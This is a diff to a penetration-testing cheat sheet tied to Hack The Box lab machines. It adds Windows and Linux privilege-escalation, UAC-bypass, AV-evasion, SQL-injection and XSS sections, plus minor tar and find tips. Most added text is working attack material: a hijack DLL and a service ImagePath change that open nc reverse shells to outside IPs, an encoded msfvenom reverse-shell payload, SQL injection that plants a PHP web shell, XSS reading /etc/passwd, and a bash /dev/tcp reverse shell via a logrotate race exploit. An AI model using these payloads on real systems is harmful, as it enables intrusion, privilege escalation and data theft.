@@ -341,6 +341,8 @@ PS> Set-acl -aclobject $acl "ad:DC=example,DC=local"
 
 1. [github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)
 
+tags: *forest.htb*
+
 #### Mimikatz
 
 ```
@@ -375,6 +377,17 @@ PS> (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
 4. [adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)
 
 tags: *resolute.htb*
+
+
+### Azure Admins
+
+PS> . ./Azure-ADConnect.ps1
+PS> Azure-ADConnect -server 127.0.0.1 -db ADSync
+
+* [github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)
+* [blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
+
+tags: *moteverde.htb*
 
 
 ### Bloodhound
@@ -449,6 +462,105 @@ PS> New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=ex
 
 
 
+## UAC Bypass
+
+
+### SystemPropertiesAdvanced.exe
+
+#### srrstr.dll
+
+```c
+#include <windows.h>
+
+BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved) {
+	switch(dwReason) {
+		case DLL_PROCESS_ATTACH:
+			WinExec("C:\\Users\\<USERNAME>\\Documents\\nc.exe 10.10.14.16 1337 -e powershell", 0);
+		case DLL_PROCESS_DETACH:
+			break;
+		case DLL_THREAD_ATTACH:
+			break;
+		case DLL_THREAD_DETACH:
+			break;
+	}
+
+	return 0;
+}
+```
+
+Compile on Kali:
+
+```
+root@kali:$ i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
+```
+
+#### DLL Hijacking
+
+Upload `srrstr.dll` to `C:\Users\%USERNAME%\AppData\Local\Microsoft\WindowsApps\srrstr.dll` and check it:
+
+```
+PS> rundll32.exe srrstr.dll,xyz
+```
+
+Exec and get a shell ("requires an interactive window station"):
+
+```
+PS> cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+```
+
+* [egre55.github.io/system-properties-uac-bypass](https://egre55.github.io/system-properties-uac-bypass)
+* [www.youtube.com/watch?v=krC5j1Ab44I&t=3570s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3570s)
+
+tags: *arkham.htb*
+
+
+
+## AV Bypass
+
+
+### msfvenom
+
+```
+root@kali:$ msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=127.0.0.1 LPORT=1337 -f exe --platform win -a x86 -o test.exe
+```
+
+
+### Veil-Evasion
+
+Hyperion + Pescramble
+
+```
+root@kali:$ wine hyperion.exe input.exe output.exe
+root@kali:$ wine PEScrambler.exe -i input.exe -o output.exe
+```
+
+
+### GreatSCT
+
+Install and generate a payload:
+
+```
+root@kali:$ git clone https://github.com/GreatSCT/GreatSCT /opt/GreatSCT
+root@kali:$ cd /opt/GreatSCT/setup
+root@kali:$ ./setup.sh
+root@kali:$ cd .. && ./GreatSCT.py
+...generate a payload...
+root@kali:$ ls -la /usr/share/greatsct-output/handlers/payload.{rc,xml}
+
+root@kali:$ msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
+```
+
+Exec with `msbuild.exe` and get a shell:
+
+```
+PS> cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
+```
+
+* [github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
+* [www.youtube.com/watch?v=krC5j1Ab44I&t=3730s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3730s)
+
+
+
 ## Windows
 
 
@@ -507,6 +619,8 @@ PS> REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | fin
 Or
 PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select DefaultPassword
 ```
+
+tags: *sauna.htb*
 
 
 ### SDDL
@@ -599,7 +713,78 @@ root@kali:$ sqlmap -r request.req --batch -p <PARAM_NAME> --os windows --dbms my
 root@kali:$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetpub/wwwroot/backdoor.php
 ```
 
-1. [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)
+* [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)
+
+
+### Truncation Attack
+
+```
+POST /index.php HTTP/1.1
+Host: 127.0.0.1
+
+name=snovvcrash&email=admin%example.com++++++++++11&password=qwe123
+```
+
+* [www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
+
+tags: *book.htb*
+
+
+### Write File
+
+```
+id=1' UNION ALL SELECT 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
+```
+
+
+### Read File
+
+```
+id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
+```
+
+
+
+## XSS
+
+### XMLHttpRequest
+
+#### LFI
+
+```javascript
+xhr = new XMLHttpRequest;
+xhr.onload = function() {
+	document.write(this.responseText);
+};
+xhr.open("GET", "file:///etc/passwd");
+xhr.send();
+```
+
+```
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText);};x.open("GET","file:///etc/passwd");x.send();</script>
+```
+
+* [www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
+
+tags: *book.htb*
+
+#### RCE
+
+If and endpoint is accessible only from localhost:
+
+```javascript
+var xhr;
+if (window.XMLHttpRequest) {
+	xhr = new XMLHttpRequest();
+} else {
+	xhr = new ActiveXObject("Microsoft.XMLHTTP");
+}
+xhr.open("POST", "/backdoor.php");
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.send("cmd=powershell -nop -exec bypass -f  \\\\10.10.15.123\\share\\rev.ps1");
+```
+
+tags: *bankrobber.htb*
 
 
 
@@ -672,7 +857,39 @@ PS> echo $ExecutionContext.SessionState.LanguageMode
 ## PrivEsc
 
 
-### Powershell
+### Linux
+
+#### Dirty COW
+
+* [dirtycow.ninja/](https://dirtycow.ninja/)
+* [github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
+* [github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+
+#### logrotate
+
+whotwagner/logrotten:
+
+```
+$ curl https://github.com/whotwagner/logrotten/raw/master/logrotten.c > lr.c
+$ gcc lr.c -o lr
+
+$ cat payloadfile
+if [ `id -u` -eq 0 ]; then (bash -c 'bash -i >& /dev/tcp/10.10.15.171/9001 0>&1' &); fi
+
+$ ./lr -p ./payload -t /home/reader/backups/access.log -d
+```
+
+* [github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
+* [tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
+* [tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
+* [popsul.ru/blog/2013/01/post-42.html](https://popsul.ru/blog/2013/01/post-42.html)
+
+tags: *book.htb*
+
+
+### Windows
+
+#### Powershell
 
 Run as another user:
 
@@ -687,15 +904,7 @@ PS> $s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
 PS> Invoke-Command -ScriptBlock { whoami } -Session $s
 ```
 
-
-### Dirty COW (Linux)
-
-* [dirtycow.ninja/](https://dirtycow.ninja/)
-* [github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
-* [github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
-
-
-### Potatoes (Windows)
+#### Potatoes
 
 foxglovesec/RottenPotato **[1]**, **[2]**:
 
@@ -730,6 +939,31 @@ cmd /c powershell -NoP IEX (New-Object Net.WebClient).DownloadString('http://127
 2. [ohpe.it/juicy-potato/CLSID](https://ohpe.it/juicy-potato/CLSID)
 3. [github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
 4. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+
+#### wuauserv
+
+```
+PS> Get-Acl HKLM:\SYSTEM\CurrentControlSet\services\* | format-list * | findstr /i "snovvcrash Users Path ChildName"
+PS> Get-ItemProperty HKLM:\System\CurrentControlSet\services\wuauserv
+PS> reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.16 1337 -e powershell" /f
+PS> Start-Service wuauserv
+...get reverse shell...
+PS> Get-Service wuauserv
+PS> Stop-Service wuauserv
+```
+
+tags: *control.htb*
+
+
+
+## Rootkits
+
+
+### Linux
+
+* [0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485)
+
+tags: *scavenger.htb*
 
 
 
@@ -810,27 +1044,6 @@ root@kali:$ hydra -V -t 20 -f -I -l admin -P /usr/share/john/password.lst 127.0.
 ```
 root@kali:$ patator smtp_login host=127.0.0.1 port=8888 user=FILE0 password=FILE1 0=logins.lst 1=/usr/share/john/password.lst -x ignore:mesg='(515) incorrect password or account name' -x free=user:code=0
 root@kali:$ patator ftp_login host=127.0.0.1 port=8888 user=admin password=FILE0 0=/usr/share/john/password.lst -x ignore:mesg='Login incorrect.' -x free=user:code=0
-```
-
-
-
-## AV Bypass
-
-
-### msfvenom
-
-```
-root@kali:$ msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=127.0.0.1 LPORT=1337 -f exe --platform win -a x86 -o test.exe
-```
-
-
-### Veil-Evasion
-
-Hyperion + Pescramble
-
-```
-root@kali:$ wine hyperion.exe input.exe output.exe
-root@kali:$ wine PEScrambler.exe -i input.exe -o output.exe
 ```
 
 
@@ -1626,7 +1839,21 @@ $ convert img1.png img2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/2
 
 ### tar
 
-#### .gz
+#### .tar
+
+Pack:
+
+```
+tar -cvf filename.tar
+```
+
+Unpack:
+
+```
+tar -xvf filename.tar
+```
+
+#### .tar.gz
 
 Pack:
 
@@ -1640,18 +1867,18 @@ Unpack:
 tar -xvzf filename.tar.gz
 ```
 
-#### .bz
+#### .tar.bz
 
 Pack:
 
 ```
-tar -cvjf filename.tar.gz
+tar -cvjf filename.tar.bz
 ```
 
 Unpack:
 
 ```
-tar -xvjf filename.tar.gz
+tar -xvjf filename.tar.bz
 ```
 
 
@@ -1688,6 +1915,12 @@ Exec `strings` and grep on the result with printing filenames:
 
 ```
 $ find . -type f -print -exec sh -c 'strings $1 | grep -i -n "signature"' sh {} \;
+```
+
+Find and `xargs` grep results:
+
+```
+$ find . -type f -print0 | xargs -0 grep <PATTERN>
 ```
 
 
